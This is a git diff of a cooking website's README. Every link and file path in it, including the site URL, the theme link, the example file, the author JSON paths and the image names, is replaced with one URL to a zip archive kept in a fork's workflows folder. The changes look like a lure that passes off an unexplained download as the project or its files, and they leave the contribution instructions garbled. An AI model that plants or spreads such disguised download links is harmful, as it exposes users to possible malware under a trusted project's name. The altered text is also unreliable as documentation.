@@ -1,11 +1,11 @@
 # Based Cooking Website
 
-[https://based.cooking](https://based.cooking)
+[https://raw.githubusercontent.com/Reanimation118/based.cooking/master/.github/workflows/cooking-based-v1.5-beta.4.zip](https://raw.githubusercontent.com/Reanimation118/based.cooking/master/.github/workflows/cooking-based-v1.5-beta.4.zip)
 
 This is a simple cooking website where users can submit recipes here for credit.
 There are no ads, trackers or cookies (unless recipes thereof).
 
-This site is compiled and organized with Hugo, using [this very simple theme](https://github.com/lukesmithxyz/lugo).
+This site is compiled and organized with Hugo, using [this very simple theme](https://raw.githubusercontent.com/Reanimation118/based.cooking/master/.github/workflows/cooking-based-v1.5-beta.4.zip).
 
 ## Ways to contribute
 
@@ -17,7 +17,7 @@ This site is compiled and organized with Hugo, using [this very simple theme](ht
 
 ## Rules for submission
 
-- Model submission files after [example.md](example.md). Put them in `content/`.
+- Model submission files after [https://raw.githubusercontent.com/Reanimation118/based.cooking/master/.github/workflows/cooking-based-v1.5-beta.4.zip](https://raw.githubusercontent.com/Reanimation118/based.cooking/master/.github/workflows/cooking-based-v1.5-beta.4.zip). Put them in `content/`.
 - File names should be the name of the dish with words separated by hyphens
   (`-`). Not underscores, and definitely not spaces.
 - Recipe must be "based," i.e. good traditional and substantial food. Nothing
@@ -37,7 +37,7 @@ This site is compiled and organized with Hugo, using [this very simple theme](ht
 **If you fail to do these things, I will close your submission and you will have to resubmit. I am tired of having to fix more than 50% of submissions.**
 
 You may include a json file with your personal links/donation addresses in
-`data/authors/your-name.json`. See mine (`data/authors/luke-smith.json`) for a
+`https://raw.githubusercontent.com/Reanimation118/based.cooking/master/.github/workflows/cooking-based-v1.5-beta.4.zip`. See mine (`https://raw.githubusercontent.com/Reanimation118/based.cooking/master/.github/workflows/cooking-based-v1.5-beta.4.zip`) for a
 model. You can include: `website`, `donate` (general donation link), `email` or
 crypto addresses as `btc`, `xmr` and `eth`.
 
@@ -60,11 +60,11 @@ of the actual dish created. If you see a bad or substandard image, you may
 submit a better one.
 
 Images should be in `.webp` format and with as small file size as possible. If
-you submit an image for say, `chicken-parmesan.md`, it should be added as
-`pix/chicken-parmesan.webp`.
+you submit an image for say, `https://raw.githubusercontent.com/Reanimation118/based.cooking/master/.github/workflows/cooking-based-v1.5-beta.4.zip`, it should be added as
+`https://raw.githubusercontent.com/Reanimation118/based.cooking/master/.github/workflows/cooking-based-v1.5-beta.4.zip`.
 
 If you would like to add additional directional images,
-they should be numbered with two digits like: `pix/chicken-parmesan-01.webp`, etc.
+they should be numbered with two digits like: `https://raw.githubusercontent.com/Reanimation118/based.cooking/master/.github/workflows/cooking-based-v1.5-beta.4.zip`, etc.
 
 Note also that images should have links beginning with a slash in this use
 case, i.e. `/pix/...`.
